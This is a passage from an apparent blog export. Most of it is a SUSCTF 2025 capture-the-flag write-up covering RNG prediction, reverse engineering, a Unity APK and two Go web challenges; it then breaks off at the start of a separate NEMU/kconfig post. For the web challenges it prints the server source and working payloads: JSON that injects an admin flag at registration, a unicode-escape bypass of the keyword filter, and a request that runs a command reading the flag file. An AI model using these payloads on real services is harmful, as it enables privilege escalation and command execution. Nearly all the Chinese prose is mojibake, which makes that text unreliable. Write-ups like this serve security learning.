range(num_chunks_to_predict):        predicted_chunk = cracker.predict_getrandbits(32)        predicted_large_num |= (predicted_chunk &lt;&lt; (i * 32))    total_bits_to_predict = 1280    num_chunks_to_predict = total_bits_to_predict // 32    predicted_large_num = 0    for i in range(num_chunks_to_predict):        predicted_chunk = cracker.predict_getrandbits(32)        predicted_large_num |= (predicted_chunk &lt;&lt; (i * 32))    print(f&quot;\\né¢„æµ‹çš„ä¸‹ä¸€ä¸ª1280ä½éšæœºæ•°æ˜¯:\\n&#123;predicted_large_num&#125;&quot;)    print(f&#x27;å› æ­¤ï¼Œè®¡ç®—å‡ºçš„qæ˜¯&#123;next_prime(predicted_large_num)&#125;&#x27;)\né™„å½•å‡ºè¿™é“é¢˜çš„å¸ˆå‚…è¿˜æœ‰é«˜æ‹›â€¦â€¦ç”±äºmt19937åœ¨äº§ç”Ÿéšæœºæ•°çš„æ—¶å€™ï¼Œåªä½¿ç”¨äº†ä¸‰ä¸ªå†…éƒ¨çŠ¶æ€ï¼Œäº¦å³ï¼š\nx_{k+624}=x_{k+397} \\oplus ((x_k^uâˆ£x_{k+1}^l)A)å› æ­¤ï¼Œåœ¨ç”Ÿæˆæ–°çš„çŠ¶æ€æ—¶ï¼Œæˆ‘ä»¬å³ä½¿æ²¡æœ‰å®Œæ•´çš„624ä¸ª32bitæ•°ï¼Œä¾ç„¶èƒ½å¤Ÿè¿˜åŸç›¸è¿‘çš„ä¸€éƒ¨åˆ†æ­£ç¡®çŠ¶æ€ã€‚å‡è®¾æˆ‘ä»¬çš„uvåˆ—è¡¨æä¾›äº†ç¬¬0ä¸ªçŠ¶æ€åˆ°ç¬¬615ä¸ªçŠ¶æ€ï¼Œé‚£ä¹ˆï¼Œè™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“ç¬¬616åˆ°623ä¸ªçŠ¶æ€ï¼Œä½†æ˜¯ï¼Œç¬¬624ä¸ªçŠ¶æ€æ ¹æ®å…¬å¼ï¼Œæ˜¯å¯ä»¥ç¡®å®šçš„ã€‚ä¸€ç›´é€’æ¨ï¼Œç›´åˆ°ç¬¬218+624ä¸ªçŠ¶æ€éƒ½å¯ä»¥ç¡®å®šï¼Œæ¯ä¸ªçŠ¶æ€32ä½ï¼Œè¿™å·²ç»è¿œè¿œè¶…å‡ºäº†1280ä½çš„$p$æˆ–è€…$q$ã€‚å› æ­¤ï¼Œå³ä½¿æœ€å8ä¸ªstateå…¨å¡«0ï¼Œè¿™ä¸ªé—®é¢˜ä¾ç„¶å¯ä»¥æ±‚è§£ã€‚æ„Ÿè°¢ä»æ…ˆçš„å¸ˆå‚…å‘œå‘œå‘œã€‚\nWebwebä¸æ˜¯æˆ‘çš„æ–¹å‘ï¼Œä¸è¿‡çœ‹åˆ°äº†æœ‰ä¸¤é¢˜å¾ˆå¤šäººå‡ºäº†ï¼Œä¼°è®¡æ˜¯ç­¾åˆ°é¢˜ï¼Œç®€å•AIä¸€ä¸‹å°±ç»“æŸï¼ˆ\nam i admin?package mainimport (\t&quot;log&quot;\t&quot;net/http&quot;)const PORT_STR = &quot;:8080&quot;func main() &#123;\tadminPassword := GenRandomSeq(16)\tlog.Printf(&quot;Admin password: %s\\n&quot;, adminPassword)\tadminUserCreds := UserCreds&#123;\t\tUsername: &quot;admin&quot;,\t\tPassword: adminPassword,\t\tIsAdmin:  true,\t&#125;\tstore := NewSessionStore()\tuserDB := NewUserDB()\tuserDB.Lock()\tuserDB.users[&quot;admin&quot;] = adminUserCreds\tuserDB.Unlock()\tauth := &amp;Auth&#123;\t\tAdminPassword: adminPassword,\t\tStore:         store,\t\tUserDB:        userDB,\t&#125;\thttp.HandleFunc(&quot;/register&quot;, auth.RegisterHandler)\thttp.HandleFunc(&quot;/login&quot;, auth.LoginHandler)\thttp.HandleFunc(&quot;/logout&quot;, auth.LogoutHandler)\thttp.HandleFunc(&quot;/run&quot;, auth.RequireAdmin(RunCommandHandler))\tlog.Printf(&quot;Server running on %s\\n&quot;, PORT_STR)\tlog.Fatal(http.ListenAndServe(PORT_STR, nil))&#125;\nmainå‡½æ•°æä¾›äº†æ³¨å†Œã€ç™»å½•ã€ç™»å‡ºå’Œæ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ï¼Œå…¶ä¸­/runå¿…é¡»æ˜¯ç®¡ç†å‘˜æ‰å¯ä»¥æ‰§è¡Œã€‚ç®¡ç†å‘˜ä¿¡æ¯å­˜å‚¨åœ¨UserCredsçš„IsAdminé¡¹ã€‚\npackage mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;net/http&quot;\t&quot;sync&quot;)type UserCreds struct &#123;\tUsername string `json:&quot;username&quot;`\tPassword string `json:&quot;password&quot;`\tIsAdmin  bool&#125;type SessionStore struct &#123;\tsync.Mutex\tsessions map[string]UserCreds // sessionID -&gt; UserCreds&#125;func NewSessionStore() *SessionStore &#123;\treturn &amp;SessionStore&#123;sessions: make(map[string]UserCreds)&#125;&#125;type UserDB struct &#123;\tsync.Mutex\tusers map[string]UserCreds // username -&gt; creds&#125;func NewUserDB() *UserDB &#123;\treturn &amp;UserDB&#123;users: make(map[string]UserCreds)&#125;&#125;type Auth struct &#123;\tAdminPassword string\tStore         *SessionStore\tUserDB        *UserDB&#125;func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;\tvar c UserCreds\tjson.NewDecoder(r.Body).Decode(&amp;c)\tif c.Username == &quot;&quot; || c.Password == &quot;&quot; &#123;\t\thttp.Error(w, &quot;username and password required&quot;, http.StatusBadRequest)\t\treturn\t&#125;\tif c.Username == &quot;admin&quot; &#123;\t\thttp.Error(w, &quot;cannot register as admin&quot;, http.StatusForbidden)\t\treturn\t&#125;\ta.UserDB.Lock()\tdefer a.UserDB.Unlock()\tif _, exists := a.UserDB.users[c.Username]; exists &#123;\t\thttp.Error(w, &quot;username already exists&quot;, http.StatusConflict)\t\treturn\t&#125;\ta.UserDB.users[c.Username] = c\tw.Write([]byte(&quot;register success&quot;))&#125;func (a *Auth) LoginHandler(w http.ResponseWriter, r *http.Request) &#123;\tvar c UserCreds\tjson.NewDecoder(r.Body).Decode(&amp;c)\ta.UserDB.Lock()\tuser, ok := a.UserDB.users[c.Username]\ta.UserDB.Unlock()\tif ok &amp;&amp; user.Password == c.Password &#123;\t\tif user.Username == &quot;admin&quot; &amp;&amp; user.Password == a.AdminPassword &#123;\t\t\tuser.IsAdmin = true\t\t&#125;\t\tsessionID := GenRandomSeq(32)\t\ta.Store.Lock()\t\ta.Store.sessions[sessionID] = user\t\ta.Store.Unlock()\t\thttp.SetCookie(w, &amp;http.Cookie&#123;Name: &quot;session_id&quot;, Value: sessionID, Path: &quot;/&quot;&#125;)\t\tfmt.Fprintf(w, &quot;user %s logged in&quot;, user.Username)\t\treturn\t&#125;\thttp.Error(w, &quot;invalid credentials&quot;, http.StatusUnauthorized)&#125;func (a *Auth) LogoutHandler(w http.ResponseWriter, r *http.Request) &#123;\tcookie, err := r.Cookie(&quot;session_id&quot;)\tif err != nil &#123;\t\thttp.Error(w, &quot;no session, are you logged in?&quot;, http.StatusInternalServerError)\t\treturn\t&#125;\ta.Store.Lock()\tdelete(a.Store.sessions, cookie.Value)\ta.Store.Unlock()\tw.Write([]byte(&quot;user logged out&quot;))&#125;func (a *Auth) RequireAdmin(next http.HandlerFunc) http.HandlerFunc &#123;\treturn func(w http.ResponseWriter, r *http.Request) &#123;\t\tcookie, err := r.Cookie(&quot;session_id&quot;)\t\tif err != nil &#123;\t\t\thttp.Error(w, &quot;not logged in&quot;, http.StatusUnauthorized)\t\t\treturn\t\t&#125;\t\ta.Store.Lock()\t\tuser, ok := a.Store.sessions[cookie.Value]\t\ta.Store.Unlock()\t\tif !ok || !user.IsAdmin &#123;\t\t\thttp.Error(w, &quot;admin only&quot;, http.StatusForbidden)\t\t\treturn\t\t&#125;\t\tnext(w, r)\t&#125;&#125;\nauth.goä¸­æä¾›äº†æ³¨å†Œã€ç™»å½•ç™»å‡ºå’Œç®¡ç†å‘˜æƒé™éªŒè¯åŠŸèƒ½ï¼Œä½†æ˜¯ï¼Œæ³¨å†Œçš„æ–¹æ³•åªæ‹’ç»ç”¨æˆ·æ³¨å†Œä¸ºadminï¼Œç”¨æˆ·å¯ä»¥è‡ªå·±æŠŠæƒé™å†™è¿›jsonã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥POST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;, &quot;IsAdmin&quot; :true&#125;ï¼ŒæœåŠ¡å™¨å°±ä¼šå°†Isadminä¹Ÿä¿å­˜ï¼Œç™»å½•è®¿é—®runå³å¯ã€‚\nç™»å½•ï¼šPOST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;&#125;\næ‰§è¡Œå‘½ä»¤ï¼šPOST&#123;&quot;cmd&quot;:&quot;cat&quot;, &quot;args&quot;:[&quot;/flag&quot;]&#125;\nam i admin? 2package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;io&quot;\t&quot;net/http&quot;\t&quot;strings&quot;\t&quot;sync&quot;)type UserCreds struct &#123;\tUsername string `json:&quot;username&quot;`\tPassword string `json:&quot;password&quot;`\tIsAdmin  bool&#125;type SessionStore struct &#123;\tsync.Mutex\tsessions map[string]UserCreds // sessionID -&gt; UserCreds&#125;func NewSessionStore() *SessionStore &#123;\treturn &amp;SessionStore&#123;sessions: make(map[string]UserCreds)&#125;&#125;type UserDB struct &#123;\tsync.Mutex\tusers map[string]UserCreds // username -&gt; creds&#125;func NewUserDB() *UserDB &#123;\treturn &amp;UserDB&#123;users: make(map[string]UserCreds)&#125;&#125;type Auth struct &#123;\tAdminPassword string\tStore         *SessionStore\tUserDB        *UserDB&#125;func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;\tbody, _ := io.ReadAll(r.Body)\tbodyStr := string(body)\tif strings.Contains(bodyStr, &quot;IsAdmin&quot;) &#123;\t\thttp.Error(w, &quot;not allowed!&quot;, http.StatusForbidden)\t\treturn\t&#125;\tvar c UserCreds\tjson.Unmarshal(body, &amp;c)\tif c.Username == &quot;&quot; || c.Password == &quot;&quot; &#123;\t\thttp.Error(w, &quot;username and password required&quot;, http.StatusBadRequest)\t\treturn\t&#125;\tif c.Username == &quot;admin&quot; &#123;\t\thttp.Error(w, &quot;cannot register as admin&quot;, http.StatusForbidden)\t\treturn\t&#125;\ta.UserDB.Lock()\tdefer a.UserDB.Unlock()\tif _, exists := a.UserDB.users[c.Username]; exists &#123;\t\thttp.Error(w, &quot;username already exists&quot;, http.StatusConflict)\t\treturn\t&#125;\ta.UserDB.users[c.Username] = c\tw.Write([]byte(&quot;register success&quot;))&#125;func (a *Auth) LoginHandler(w http.ResponseWriter, r *http.Request) &#123;\tbody, _ := io.ReadAll(r.Body)\tbodyStr := string(body)\tif strings.Contains(bodyStr, &quot;IsAdmin&quot;) &#123;\t\thttp.Error(w, &quot;not allowed!&quot;, http.StatusForbidden)\t\treturn\t&#125;\tvar c UserCreds\tjson.Unmarshal(body, &amp;c)\ta.UserDB.Lock()\tuser, ok := a.UserDB.users[c.Username]\ta.UserDB.Unlock()\tif ok &amp;&amp; user.Password == c.Password &#123;\t\tif user.Username == &quot;admin&quot; &amp;&amp; user.Password == a.AdminPassword &#123;\t\t\tuser.IsAdmin = true\t\t&#125;\t\tsessionID := GenRandomSeq(32)\t\ta.Store.Lock()\t\ta.Store.sessions[sessionID] = user\t\ta.Store.Unlock()\t\thttp.SetCookie(w, &amp;http.Cookie&#123;Name: &quot;session_id&quot;, Value: sessionID, Path: &quot;/&quot;&#125;)\t\tfmt.Fprintf(w, &quot;user %s logged in&quot;, user.Username)\t\treturn\t&#125;\thttp.Error(w, &quot;invalid credentials&quot;, http.StatusUnauthorized)&#125;func (a *Auth) LogoutHandler(w http.ResponseWriter, r *http.Request) &#123;\tcookie, err := r.Cookie(&quot;session_id&quot;)\tif err != nil &#123;\t\thttp.Error(w, &quot;no session, are you logged in?&quot;, http.StatusInternalServerError)\t\treturn\t&#125;\ta.Store.Lock()\tdelete(a.Store.sessions, cookie.Value)\ta.Store.Unlock()\tw.Write([]byte(&quot;user logged out&quot;))&#125;func (a *Auth) RequireAdmin(next http.HandlerFunc) http.HandlerFunc &#123;\treturn func(w http.ResponseWriter, r *http.Request) &#123;\t\tcookie, err := r.Cookie(&quot;session_id&quot;)\t\tif err != nil &#123;\t\t\thttp.Error(w, &quot;not logged in&quot;, http.StatusUnauthorized)\t\t\treturn\t\t&#125;\t\ta.Store.Lock()\t\tuser, ok := a.Store.sessions[cookie.Value]\t\ta.Store.Unlock()\t\tif !ok || !user.IsAdmin &#123;\t\t\thttp.Error(w, &quot;admin only&quot;, http.StatusForbidden)\t\t\treturn\t\t&#125;\t\tnext(w, r)\t&#125;&#125;\nä¸å‰ä¸€é¢˜çš„åŒºåˆ«åœ¨äºç°åœ¨ä¼ ä¸Šå»çš„jsonä¸²å¦‚æœåŒ…å«IsAdminå°±ä¼šè¢«æ‹’ç»äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨unicodeè½¬ä¹‰ç»•è¿‡å»ï¼Œå…¶ä»–çš„åŒä¸Šã€‚\næ³¨å†Œæ—¶ä½¿ç”¨ POST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;, &quot;IsAd\\u006din&quot; :true&#125;\n\nå¦‚æœä½ ç»§ç»­é˜…è¯»ä¸Šé¢é‚£ç¯‡æ–‡ç« çš„è¯ï¼Œä¼šæƒŠè®¶ï¼ˆçœŸçš„å—ï¼‰åœ°å‘ç° encoding/json é»˜è®¤æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼šæ‰€ä»¥æˆ‘ä»¬éšä¾¿æ”¹ä¸ªå¤§å°å†™å°±èƒ½ç»•è¿‡æ£€æŸ¥ã€‚â€”â€”å®˜æ–¹wp\n\nReverseezsigninç®€å•ç­¾åˆ°ï¼Œç©ä¸€ä¸‹ï¼Œçœ‹èµ·æ¥æ˜¯è¿·å®«ã€‚\næœç´¢å­—ç¬¦ä¸²ï¼Œæœåˆ°äº†ï¼Œæ€ä¹ˆæ²¡æœ‰å¼•ç”¨(Xref)ï¼Ÿé‚£æˆ‘æ€ä¹ˆæ‰¾mainå‡½æ•°ï¼Ÿ\n\n\néšä¾¿çœ‹çœ‹ä»£ç æ®µ(.text)å‘ç°ä¸å¯¹åŠ²ï¼Œæœ‰èŠ±æŒ‡ä»¤ï¼Œloc_1A65ä¸Šä¸€è¡Œè·³è½¬åˆ°è¿™è¡ŒæŒ‡ä»¤ä¸­é—´äº†ã€‚\n\næŒ‰Uå°†ä»£ç è¿˜åŸä¸ºå­—èŠ‚ï¼Œæ”¹æ‰å¤´ä¸¤ä¸ªï¼Œå†æŒ‰Cå°†å‰©ä½™éƒ¨åˆ†è¯†åˆ«ä¸ºä»£ç ï¼Œè¿™ä¸‹çœ‹èµ·æ¥æ­£å¸¸å¤šäº†ã€‚\n\nä¸Šé¢è¿˜æœ‰è‹¥å¹²èŠ±æŒ‡ä»¤ï¼ŒåŒæ ·å»é™¤ï¼Œä¿å­˜åˆ°æºæ–‡ä»¶ä¸­ï¼Œå†æ¬¡æ‰“å¼€å°±ä¼šå‘ç°å­—ç¬¦ä¸²éƒ½æœ‰å¼•ç”¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ®æ­¤æ‰¾åˆ°mainå‡½æ•°æ˜¯sub_17A2ã€‚\n\nè¿›å…¥mainå‡½æ•°ï¼Œå‡½æ•°é€»è¾‘æ¯”è¾ƒæ¸…æ¥šï¼Œç¬¬ä¸€å…³æ˜¯èµ°è¿·å®«ï¼Œå…¶ä¸­1ï¼Œ2ï¼Œ3ï¼Œ4åˆ†åˆ«å¯¹åº”å³ä¸‹å·¦ä¸Šã€‚è¿·å®«æ˜¯E1110000010000010001110001000001111Oï¼Œå¯ä»¥çŒœæµ‹Eå’ŒOåˆ†åˆ«æ˜¯èµ·ç‚¹å’Œç»ˆç‚¹ã€‚æ¯èµ°ä¸€æ­¥éƒ½ä¼šåˆ¤æ–­ä¼šä¸ä¼šæ’å¢™ï¼Œå¢™ç”¨&#39;0&#39;(48)è¡¨ç¤ºã€‚\n\nç»™è¿·å®«åˆ†ä¸€ä¸‹å—ï¼Œä»ä»£ç å¯ä»¥çœ‹å‡ºæ˜¯æ¯6ä¸ªå­—ç¬¦ä¸ºä¸€è¡Œï¼Œæˆ–è€…å› ä¸ºä¸€å…±æ˜¯36ä¸ªå­—ç¬¦ï¼ŒçŒœä¹Ÿå¾—çŒœæ˜¯ä¸ªæ–¹å½¢ã€‚\nE11100            è·¯å¾„ï¼š1112223322111100010000010001110001000001111O\nè¾“å…¥åè¿›å…¥ç¬¬äºŒå…³ï¼Œç¬¬äºŒå…³ä¼šæ ¹æ®åˆšæ‰çš„è¾“å…¥è¿›è¡Œä¸åŒçš„åŠ å¯†ï¼ŒåŠ å¯†åå’Œå›ºå®šçš„å¯†æ–‡æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åè¿‡æ¥è§£å¯†ã€‚\nå¯†æ–‡ï¼š2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTeRptgvAmfzdqmE9skCSRbEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuECqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr\nè§£å¯†é¡ºåºï¼š11112233222111\n\nå¾ˆå¹¸è¿çš„æ˜¯æ²¡æœ‰4ï¼Œæˆ‘ä»¬å¯ä»¥å°‘åˆ†æä¸€ä¸ªå‡½æ•°ï¼Œå…¶å®4æ˜¯å¼‚æˆ–ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äº†å°±è¿˜åŸä¸äº†äº†ï¼ˆï¼‰\n//case &#x27;1&#x27;int __cdecl sub_148D(int a1)&#123;  int result; // eax  int v2; // [esp+8h] [ebp-8h]  int i; // [esp+Ch] [ebp-4h]  v2 = sub_1337(a1);  for ( i = 0; ; ++i )  &#123;    result = i;    if ( i &gt;= v2 )      break;    *(_BYTE *)(i + a1) ^= 0x66u;  &#125;  return result;&#125;\na1æ˜¯ä¼ å…¥çš„å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œç›´æ¥å°±æ˜¯æ¯ä¸€ä½å¼‚æˆ–0x66ã€‚\nvoid __cdecl sub_14EB(void *src)&#123;  int v1; // eax  int v2; // eax  _BYTE *ptr; // [esp+0h] [ebp-38h]  int nmemb; // [esp+4h] [ebp-34h]  unsigned __int8 *dest; // [esp+8h] [ebp-30h]  signed int size; // [esp+Ch] [ebp-2Ch]  int ii; // [esp+10h] [ebp-28h]  signed int n; // [esp+14h] [ebp-24h]  int v9; // [esp+18h] [ebp-20h]  int m; // [esp+1Ch] [ebp-1Ch]  int k; // [esp+20h] [ebp-18h]  unsigned int v12; // [esp+24h] [ebp-14h]  unsigned int v13; // [esp+24h] [ebp-14h]  signed int j; // [esp+28h] [ebp-10h]  signed int i; // [esp+2Ch] [ebp-Ch]  size = sub_1337(src);  dest = (unsigned __int8 *)malloc(size);  memcpy(dest, src, size);  dest[size] = -1;  for ( i = 0; i &lt; size &amp;&amp; !dest[i]; ++i )    ;  nmemb = 138 * size / 100 + 1;  ptr = calloc(nmemb, 1u);  for ( j = 0; j &lt; size; ++j )  &#123;    v12 = dest[j];    for ( k = 138 * size / 100; k &gt;= 0; --k )    &#123;      v13 = ((unsigned __int8)ptr[k] &lt;&lt; 8) + v12;      ptr[k] = v13 % 0x3A;      v12 = v13 / 0x3A;    &#125;  &#125;  for ( m = 0; m &lt; nmemb &amp;&amp; !ptr[m]; ++m )    ;  v9 = 0;  for ( n = 0; n &lt; i; ++n )  &#123;    v1 = v9++;    *((_BYTE *)src + v1) = 49;  &#125;  for ( ii = m; ii &lt; nmemb; ++ii )  &#123;    v2 = v9++;    *((_BYTE *)src + v2) = byte_20C0[(unsigned __int8)ptr[ii]];  &#125;  *((_BYTE *)src + v9) = -1;  free(dest);  free(ptr);&#125;\nAIå‘Šè¯‰æˆ‘è¿™æ˜¯base58ç¼–ç ï¼Œæˆ‘çœ‹ä¸å‡ºæ¥ï¼ˆï¼‰å¤§è‡´æµç¨‹æ˜¯è®¡ç®—åŸå­—ç¬¦ä¸²é•¿åº¦ï¼Œåˆ†é…ä¸€å—1.38å€çš„ç©ºé—´ï¼Œå°†åŸå­—ç¬¦ä¸²çš„å‰å¯¼é›¶éƒ½æ”¹å†™ä¸º&#39;1&#39;(49)ï¼Œå¹¶å°†å‰©ä¸‹çš„å­—ç¬¦è§†ä¸º256è¿›åˆ¶å¤§æ•°ï¼Œè½¬åŒ–æˆ58è¿›åˆ¶çš„æ•°ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦1.38å€ç©ºé—´ï¼Œå› ä¸º$log_{58}256\\approx1.366$ï¼Œå†åŠ ä¸Šä¸€ç‚¹ä½™è£•ã€‚\nå¯¹äºè½¬åŒ–åçš„58è¿›åˆ¶æ•°ï¼Œæ ¹æ®byte_20C0è½¬æ¢ä¸ºå­—ç¬¦ã€‚è¿™ä¸ªæ˜ å°„è¡¨ä¹Ÿæ˜¯æ ‡å‡†çš„123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyzï¼Œæ²¡0æ²¡Iã€‚æ˜ å°„åçš„å­—ç¬¦ç›´æ¥èµ‹ç»™åŸå§‹å­—ç¬¦ä¸²ï¼Œæœ€åé‡Šæ”¾æ‰€æœ‰ç”³è¯·çš„ç©ºé—´ï¼Œå®Œæˆä¸€æ¬¡base58ã€‚\nint __cdecl sub_16E2(int a1, char *s)&#123;  int v3[68]; // [esp+8h] [ebp-110h] BYREF  sub_123D((int)v3, s);  return sub_1368(v3, a1);&#125;int __cdecl sub_123D(int a1, char *s)&#123;  int result; // eax  char v3; // [esp+Fh] [ebp-19h]  signed int v4; // [esp+10h] [ebp-18h]  int j; // [esp+14h] [ebp-14h]  int v6; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  v4 = strlen(s);  for ( i = 0; i &lt;= 255; ++i )    *(_BYTE *)(a1 + i) = i;  v6 = 0;  for ( j = 0; j &lt;= 255; ++j )  &#123;    v6 = (*(unsigned __int8 *)(a1 + j) + v6 + (unsigned __int8)s[j % v4]) % 256;    v3 = *(_BYTE *)(a1 + j);    *(_BYTE *)(a1 + j) = *(_BYTE *)(a1 + v6);    *(_BYTE *)(v6 + a1) = v3;  &#125;  *(_DWORD *)(a1 + 256) = 0;  result = a1;  *(_DWORD *)(a1 + 260) = 0;  return result;&#125;int __cdecl Â·(int a1, int a2)&#123;  int result; // eax  char v3; // [esp+Fh] [ebp-15h]  int v4; // [esp+10h] [ebp-14h]  int i; // [esp+14h] [ebp-10h]  int v6; // [esp+18h] [ebp-Ch]  int v7; // [esp+1Ch] [ebp-8h]  v4 = sub_1337(a2);  v7 = *(_DWORD *)(a1 + 256);  v6 = *(_DWORD *)(a1 + 260);  for ( i = 0; i &lt; v4; ++i )  &#123;    v7 = (v7 + 1) % 256;    v6 = (v6 + *(unsigned __int8 *)(a1 + v7)) % 256;    v3 = *(_BYTE *)(a1 + v7);    *(_BYTE *)(a1 + v7) = *(_BYTE *)(a1 + v6);    *(_BYTE *)(v6 + a1) = v3;    *(_BYTE *)(i + a2) ^= *(_BYTE *)(a1 + (unsigned __int8)(*(_BYTE *)(a1 + v7) + *(_BYTE *)(a1 + v6)));  &#125;  *(_DWORD *)(a1 + 256) = v7;  result = a1;  *(_DWORD *)(a1 + 260) = v6;  return result;&#125;\nAIå¾ˆå®¹æ˜“å°±çœ‹å‡ºäº†å®ƒæ˜¯RC4ç®—æ³•ï¼Œsub_123Dæ˜¯å¯†é’¥ç”Ÿæˆè¿‡ç¨‹ï¼Œç»™æ•°ç»„v3å‰256ä¸ªå­—èŠ‚èµ‹å€¼0åˆ°255å¹¶æ‰“ä¹±ï¼Œè¿˜å°†[a1 + 256]å’Œ[a1 + 260]èµ‹å€¼ä¸º0ï¼Œå®ƒä»¬æœ€åæˆä¸ºäº†è®¡æ•°å™¨ï¼›sub_1368æ‰§è¡Œæ›´æ–°è®¡æ•°å™¨å’Œäº¤æ¢æ“ä½œï¼Œå°†åŠ å¯†çš„æ•°æ®æ”¾å›åŸæ¥çš„æ•°ç»„ä¸­ã€‚\nå¥½æ¶ˆæ¯æ˜¯ï¼Œå¼‚æˆ–å’ŒåŒä¸€ä¸ªkeyçš„RC4åŠ å¯†ï¼Œè¿ç»­ä¸¤æ¬¡éƒ½å¯ä»¥æŠµæ¶ˆï¼Œå› æ­¤å®é™…ä¸ŠåŸå§‹flagåªå¼‚æˆ–1æ¬¡ï¼Œå†base58ç¼–ç 5æ¬¡å¾—åˆ°å¯†æ–‡ï¼Œå€’æ¨å³å¯å¾—åˆ°flagã€‚\nä¸€ä¸ªé¥¼å¹²äººé™„ä»¶æ˜¯ä¸€ä¸ªAPKï¼Œç®€å•çœ‹çœ‹assetså’Œlibå‘ç°ç»“æ„å¼‚å¸¸ç†Ÿæ‚‰ï¼Œè¿™ä¸æ˜¯Unityå—ï¼Œè¿˜æ˜¯il2cppæ‰“åŒ…çš„ï¼Œè¿™ä¸‹æœ‰å¾—é€†äº†ã€‚\nç„¶åæœ‰ä¸€ä¸ªæç¤ºâ€”â€”\n\né»„é‡‘èŠå£«é¥¼å¹²è¯´ab is so delicious\n\nå¥½çš„ä¸ç”¨é€†äº†ï¼Œä¸‰åˆ†é’Ÿçš„äº‹ã€‚çœ‹åˆ°abç«‹åˆ»æƒ³åˆ°Unityçš„èµ„æºå­˜å‚¨æ–¹å¼asset bundleï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åŠ è½½è¿™ä¸ªAPKçš„æ‰€æœ‰èµ„æºåŒ…ã€‚ç°åœ¨æœ€æ–°çš„è½¯ä»¶æ˜¯AssetRipperï¼Œå°†apkè§£å‹ï¼Œæ•´ä¸ªæ–‡ä»¶å¤¹å¯¼å…¥å³å¯æ‰¾åˆ°æ‰€æœ‰èµ„æºåŒ…ï¼Œèµ„æºå±…ç„¶éƒ½æ²¡æœ‰åŠ å¯†ï¼ŒçœŸæ˜¯å¤ªå¥½å¿ƒäº†ã€‚\næ‰¾åˆ°ä¸€ä¸ªåŒ…å«deliciousï¼Œé‡Œé¢æ˜¯å››ä¸ªTexture2Dï¼Œä¹Ÿå°±æ˜¯å›¾ç‰‡ï¼Œå››å¼ å›¾éƒ½æ˜¯flagçš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ç•¥æœ‰é‡å ï¼Œå»PSæ‹¼ä¸€æ‹¼å°±å¥½äº†ã€‚\n\n\nå†™åœ¨æœ€åç¬¬äºŒæ¬¡æ‰“äº†ï¼Œå¤§å­¦ç”Ÿæ´»å…¶å®è¿‡å¾—ä¹Ÿè›®å¿«çš„ï¼Œè¿˜èƒ½æ‰“å‡ æ¬¡å‘¢ï¼Ÿä¸çŸ¥é“ï¼Œæ€»ä¹‹çæƒœæ¯ä¸€åœºæ¯”èµ›äº†ã€‚\nå­¦æ ¡é‡Œä¸å¤ªå¤šå¯†ç å­¦å¸ˆå‚…ï¼Œä½†æ˜¯æˆ‘çš„æŠ€æœ¯ä¹Ÿä¸æ€ä¹ˆæ ·ï¼ŒåŠªåŠ›å­¦ä¹ å§ã€‚\n","categories":["ç¬”è®°"],"tags":["Writeup","2025","SUSCTF"]},{"title":"PA1","url":"/2025/11/09/PA1/","content":"RTFSCæ¡†æ¶åˆæ¢NEMUç”±å››éƒ¨åˆ†æ„æˆï¼šmonitor, CPU, memory, è®¾å¤‡monitorè´Ÿè´£å’ŒLinuxäº¤äº’ï¼Œè°ƒè¯•çš„åŠŸèƒ½\nkconfigè¿™ä¸€å—æ˜¯ç®€å•è®²è§£ kconfig çš„ä½œç”¨ã€‚\nåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œæœ‰å¾ˆå¤šå¯é…ç½®é€‰é¡¹ï¼Œé…ç½®é€‰é¡¹ä¹‹é—´ä¼šæœ‰ä¾èµ–å’Œå…³è”ã€‚æ¯”å¦‚æˆ‘ä»¬ç©çš„æ¸¸æˆè®¾ç½®ï¼š\n\nå›¾å½¢è´¨é‡ï¼š(é«˜ / ä½)\nå…‰çº¿è¿½è¸ªï¼š(å¼€ / å…³) â€”â€” è¿™ä¸ªé€‰é¡¹åªæœ‰åœ¨â€œé«˜â€ç”»è´¨æ—¶æ‰èƒ½å¼€å¯ã€‚è€Œè¿™äº›è®¾ç½®ï¼Œåœ¨ä»£ç é‡Œé¢é€šå¸¸è¦ç”¨å®æ¥å®ç°ï¼Œæ¯”å¦‚ï¼š\n\n// config.h#define CONFIG_DEBUG 1#define CONFIG_WELCOME_MSG &quot;Welcome to NEMU!&quot;\nå¦‚æœæ‰‹åŠ¨é…ç½®è¿™äº›é…ç½®æ–‡ä»¶å®ï¼Œä¼šéå¸¸éº»çƒ¦ä¸”å®¹æ˜“å‡ºé”™ã€‚å› æ­¤å¼•å…¥æ–°çš„è½¯ä»¶ kconfigï¼Œå…·ä½“æè¿°è§è®²ä¹‰ã€‚nemuçš„æ­¥éª¤ make menuconfig ï¼š\n\nå®šä¹‰ (Kconfig)\n\nå¼€å‘è€…åœ¨ nemu/Kconfig 